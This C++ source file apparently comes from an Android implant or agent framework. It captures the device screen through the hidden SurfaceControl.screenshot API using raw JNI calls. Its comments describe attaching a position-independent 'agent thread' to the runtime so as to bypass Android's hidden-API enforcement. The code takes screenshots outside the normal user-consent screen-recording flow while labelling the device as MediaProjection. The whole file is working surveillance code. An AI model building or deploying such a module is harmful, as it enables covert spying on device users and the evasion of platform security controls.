/**
 * @file screen.cc
 * @brief Android screen capture via SurfaceControl hidden API (JNI)
 *
 * @details Captures the screen by calling Android's hidden SurfaceControl
 * screenshot API via JNI. Uses raw JNI table indices (JNI_FN macro)
 * to avoid struct layout mismatches that cause SIGBUS crashes.
 *
 * The PIC agent thread is attached to ART via AttachCurrentThreadAsDaemon
 * (no classloader context), which bypasses hidden API enforcement.
 *
 * All state is stack-local — no static/global variables (PIC constraint).
 */

#include "platform/screen/screen.h"
#include "core/memory/memory.h"
#include "platform/kernel/android/jni.h"
#include "platform/kernel/android/syscall.h"
#include "platform/kernel/android/system.h"

// =============================================================================
// JNI helpers — safe wrappers that clear exceptions on failure
// =============================================================================

static jclass SafeFindClass(JNIEnv *env, const CHAR *name)
{
	jclass cls = JNI_FN(env, JniFn_FindClass, JNI_IDX_FindClass)((PVOID)env, name);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return cls;
}

static jmethodID SafeGetMethodID(JNIEnv *env, jclass cls, const CHAR *name, const CHAR *sig)
{
	jmethodID mid = JNI_FN(env, JniFn_GetMethodID, JNI_IDX_GetMethodID)((PVOID)env, cls, name, sig);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return mid;
}

static jmethodID SafeGetStaticMethodID(JNIEnv *env, jclass cls, const CHAR *name, const CHAR *sig)
{
	jmethodID mid = JNI_FN(env, JniFn_GetStaticMethodID, JNI_IDX_GetStaticMethodID)((PVOID)env, cls, name, sig);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return mid;
}

static jobject SafeCallObjectMethod(JNIEnv *env, jobject obj, jmethodID mid)
{
	jobject result = JNI_FN(env, JniFn_CallObjectMethod, JNI_IDX_CallObjectMethod)((PVOID)env, obj, mid);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return result;
}

static jobject SafeCallObjectMethodArg(JNIEnv *env, jobject obj, jmethodID mid, jobject arg)
{
	jobject result = JNI_FN(env, JniFn_CallObjectMethod, JNI_IDX_CallObjectMethod)((PVOID)env, obj, mid, arg);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return result;
}

static jint SafeCallIntMethod(JNIEnv *env, jobject obj, jmethodID mid)
{
	jint result = JNI_FN(env, JniFn_CallIntMethod, JNI_IDX_CallIntMethod)((PVOID)env, obj, mid);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return -1;
	}
	return result;
}

static jobject SafeCallStaticObjectMethod(JNIEnv *env, jclass cls, jmethodID mid)
{
	jobject result = JNI_FN(env, JniFn_CallStaticObjectMethod, JNI_IDX_CallStaticObjectMethod)((PVOID)env, cls, mid);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return result;
}

static jobject SafeCallStaticObjectMethodA(JNIEnv *env, jclass cls, jmethodID mid, const jvalue *args)
{
	jobject result = JNI_FN(env, JniFn_CallStaticObjectMethodA, JNI_IDX_CallStaticObjectMethodA)((PVOID)env, cls, mid, args);
	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return nullptr;
	}
	return result;
}

// =============================================================================
// Display metrics via WindowManager JNI
// =============================================================================

static BOOL GetDisplayMetrics(JNIEnv *env, UINT32 &width, UINT32 &height)
{
	auto atClassName = "android/app/ActivityThread";
	jclass atClass = SafeFindClass(env, (const CHAR *)atClassName);
	if (atClass == nullptr)
		return false;

	auto currentAppName = "currentApplication";
	auto currentAppSig = "()Landroid/app/Application;";
	jmethodID currentApp = SafeGetStaticMethodID(env, atClass, (const CHAR *)currentAppName, (const CHAR *)currentAppSig);
	if (currentApp == nullptr)
		return false;

	jobject context = SafeCallStaticObjectMethod(env, atClass, currentApp);
	if (context == nullptr)
		return false;

	jclass ctxClass = JNI_FN(env, JniFn_GetObjectClass, JNI_IDX_GetObjectClass)((PVOID)env, context);
	auto getSvcName = "getSystemService";
	auto getSvcSig = "(Ljava/lang/String;)Ljava/lang/Object;";
	jmethodID getSvc = SafeGetMethodID(env, ctxClass, (const CHAR *)getSvcName, (const CHAR *)getSvcSig);
	if (getSvc == nullptr)
		return false;

	auto windowStr = "window";
	jstring windowSvc = JNI_FN(env, JniFn_NewStringUTF, JNI_IDX_NewStringUTF)((PVOID)env, (const CHAR *)windowStr);
	jobject wm = SafeCallObjectMethodArg(env, context, getSvc, windowSvc);
	JNI_FN(env, JniFn_DeleteLocalRef, JNI_IDX_DeleteLocalRef)((PVOID)env, windowSvc);
	if (wm == nullptr)
		return false;

	auto wmClassName = "android/view/WindowManager";
	jclass wmClass = SafeFindClass(env, (const CHAR *)wmClassName);
	if (wmClass == nullptr)
		return false;

	auto getDisplayName = "getDefaultDisplay";
	auto getDisplaySig = "()Landroid/view/Display;";
	jmethodID getDisplay = SafeGetMethodID(env, wmClass, (const CHAR *)getDisplayName, (const CHAR *)getDisplaySig);
	if (getDisplay == nullptr)
		return false;

	jobject display = SafeCallObjectMethod(env, wm, getDisplay);
	if (display == nullptr)
		return false;

	jclass displayClass = JNI_FN(env, JniFn_GetObjectClass, JNI_IDX_GetObjectClass)((PVOID)env, display);
	auto intRetSig = "()I";
	auto getWidthName = "getWidth";
	auto getHeightName = "getHeight";
	jmethodID getWidth = SafeGetMethodID(env, displayClass, (const CHAR *)getWidthName, (const CHAR *)intRetSig);
	jmethodID getHeight = SafeGetMethodID(env, displayClass, (const CHAR *)getHeightName, (const CHAR *)intRetSig);

	if (getWidth == nullptr || getHeight == nullptr)
		return false;

	width = (UINT32)SafeCallIntMethod(env, display, getWidth);
	height = (UINT32)SafeCallIntMethod(env, display, getHeight);

	return (width > 0 && height > 0);
}

// =============================================================================
// SurfaceControl.screenshot() via JNI
// =============================================================================

static BOOL SurfaceControlCapture(JNIEnv *env, UINT32 width, UINT32 height, PRGB rgbBuf)
{
	auto scClassName = "android/view/SurfaceControl";
	jclass scClass = SafeFindClass(env, (const CHAR *)scClassName);
	if (scClass == nullptr)
		return false;

	// Try Android 9+: screenshot(Rect, int, int, int) → Bitmap
	auto screenshotName = "screenshot";
	auto screenshotSig = "(Landroid/graphics/Rect;III)Landroid/graphics/Bitmap;";
	jmethodID screenshotMethod = SafeGetStaticMethodID(env, scClass, (const CHAR *)screenshotName, (const CHAR *)screenshotSig);

	jobject bitmap = nullptr;

	if (screenshotMethod != nullptr)
	{
		jvalue args[4];
		args[0].l = nullptr;
		args[1].i = (jint)width;
		args[2].i = (jint)height;
		args[3].i = 0;
		bitmap = SafeCallStaticObjectMethodA(env, scClass, screenshotMethod, args);
	}

	// Fallback: screenshot(int, int) → Bitmap
	if (bitmap == nullptr)
	{
		auto altSig = "(II)Landroid/graphics/Bitmap;";
		jmethodID altMethod = SafeGetStaticMethodID(env, scClass, (const CHAR *)screenshotName, (const CHAR *)altSig);

		if (altMethod != nullptr)
		{
			jvalue args[2];
			args[0].i = (jint)width;
			args[1].i = (jint)height;
			bitmap = SafeCallStaticObjectMethodA(env, scClass, altMethod, args);
		}
	}

	if (bitmap == nullptr)
		return false;

	// Read bitmap dimensions
	jclass bmpClass = JNI_FN(env, JniFn_GetObjectClass, JNI_IDX_GetObjectClass)((PVOID)env, bitmap);
	auto intRetSig = "()I";
	auto bmpGetWidthName = "getWidth";
	auto bmpGetHeightName = "getHeight";
	jmethodID bmpGetWidth = SafeGetMethodID(env, bmpClass, (const CHAR *)bmpGetWidthName, (const CHAR *)intRetSig);
	jmethodID bmpGetHeight = SafeGetMethodID(env, bmpClass, (const CHAR *)bmpGetHeightName, (const CHAR *)intRetSig);
	if (bmpGetWidth == nullptr || bmpGetHeight == nullptr)
		return false;

	UINT32 bmpW = (UINT32)SafeCallIntMethod(env, bitmap, bmpGetWidth);
	UINT32 bmpH = (UINT32)SafeCallIntMethod(env, bitmap, bmpGetHeight);
	if (bmpW == 0 || bmpH == 0)
		return false;
	if (bmpW > width) bmpW = width;
	if (bmpH > height) bmpH = height;

	// Bitmap.getPixels(int[], offset, stride, x, y, width, height)
	USIZE pixelCount = (USIZE)bmpW * (USIZE)bmpH;
	jintArray pixelArray = JNI_FN(env, JniFn_NewIntArray, JNI_IDX_NewIntArray)((PVOID)env, (jsize)pixelCount);
	if (pixelArray == nullptr)
		return false;

	auto getPixelsName = "getPixels";
	auto getPixelsSig = "([IIIIIII)V";
	jmethodID getPixels = SafeGetMethodID(env, bmpClass, (const CHAR *)getPixelsName, (const CHAR *)getPixelsSig);
	if (getPixels == nullptr)
		return false;

	jvalue gpArgs[7];
	gpArgs[0].l = pixelArray;
	gpArgs[1].i = 0;
	gpArgs[2].i = (jint)bmpW;
	gpArgs[3].i = 0;
	gpArgs[4].i = 0;
	gpArgs[5].i = (jint)bmpW;
	gpArgs[6].i = (jint)bmpH;

	JNI_FN(env, JniFn_CallVoidMethodA, JNI_IDX_CallVoidMethodA)((PVOID)env, bitmap, getPixels, gpArgs);

	if (JNI_FN(env, JniFn_ExceptionOccurred, JNI_IDX_ExceptionOccurred)((PVOID)env))
	{
		JNI_FN(env, JniFn_ExceptionClear, JNI_IDX_ExceptionClear)((PVOID)env);
		return false;
	}

	// Read ARGB_8888 → convert to RGB
	jint *pixels = JNI_FN(env, JniFn_GetIntArrayElements, JNI_IDX_GetIntArrayElements)((PVOID)env, pixelArray, nullptr);
	if (pixels == nullptr)
		return false;

	for (UINT32 y = 0; y < bmpH; y++)
	{
		for (UINT32 x = 0; x < bmpW; x++)
		{
			UINT32 argb = (UINT32)pixels[y * bmpW + x];
			rgbBuf[y * width + x].Red   = (UINT8)((argb >> 16) & 0xFF);
			rgbBuf[y * width + x].Green = (UINT8)((argb >> 8) & 0xFF);
			rgbBuf[y * width + x].Blue  = (UINT8)(argb & 0xFF);
		}
	}

	JNI_FN(env, JniFn_ReleaseIntArrayElements, JNI_IDX_ReleaseIntArrayElements)((PVOID)env, pixelArray, pixels, 0);

	// Recycle bitmap
	auto recycleName = "recycle";
	auto recycleSig = "()V";
	jmethodID recycle = SafeGetMethodID(env, bmpClass, (const CHAR *)recycleName, (const CHAR *)recycleSig);
	if (recycle != nullptr)
		JNI_FN(env, JniFn_CallVoidMethod, JNI_IDX_CallVoidMethod)((PVOID)env, bitmap, recycle);

	return true;
}

// =============================================================================
// Public API
// =============================================================================

constexpr INT32 MEDIAPROJECTION_DEVICE_LEFT = -3000;

VOID MediaProjectionGetDevices(ScreenDevice *tempDevices, UINT32 &deviceCount, UINT32 maxDevices)
{
	if (deviceCount >= maxDevices)
		return;

	JNIEnv *env = nullptr;
	if (!JniBridgeAttach(&env, nullptr))
		return;

	UINT32 width = 0, height = 0;
	if (!GetDisplayMetrics(env, width, height))
		return;

	auto scClassName = "android/view/SurfaceControl";
	jclass scClass = SafeFindClass(env, (const CHAR *)scClassName);
	if (scClass == nullptr)
		return;

	tempDevices[deviceCount].Left = MEDIAPROJECTION_DEVICE_LEFT;
	tempDevices[deviceCount].Top = 0;
	tempDevices[deviceCount].Width = width;
	tempDevices[deviceCount].Height = height;
	tempDevices[deviceCount].Primary = true;
	deviceCount++;
}

Result<VOID, Error> MediaProjectionCapture(const ScreenDevice &device, Span<RGB> buffer)
{
	JNIEnv *env = nullptr;
	if (!JniBridgeAttach(&env, nullptr))
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	if (!SurfaceControlCapture(env, device.Width, device.Height, buffer.Data()))
		return Result<VOID, Error>::Err(Error(Error::Screen_CaptureFailed));

	return Result<VOID, Error>::Ok();
}
